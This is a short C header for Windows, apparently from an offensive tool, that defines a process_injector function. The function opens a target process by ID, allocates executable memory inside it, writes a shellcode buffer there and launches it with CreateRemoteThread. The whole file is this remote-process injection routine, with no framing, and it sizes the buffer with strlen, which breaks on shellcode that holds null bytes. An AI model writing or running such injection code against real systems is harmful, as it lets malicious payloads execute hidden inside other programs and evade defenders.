#pragma once
#include <Windows.h>

void process_injector(int pid, char *shellcode) {
	HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
	LPVOID h_mem = VirtualAllocEx(h_process, 0, strlen(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (h_mem == NULL) {
		exit(2);
	}
	WriteProcessMemory(h_process, h_mem, shellcode, strlen(shellcode), NULL);
	HANDLE h_rthread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)h_mem, NULL, 0, NULL);
	if (h_rthread == NULL) {
		exit(3);
	}
}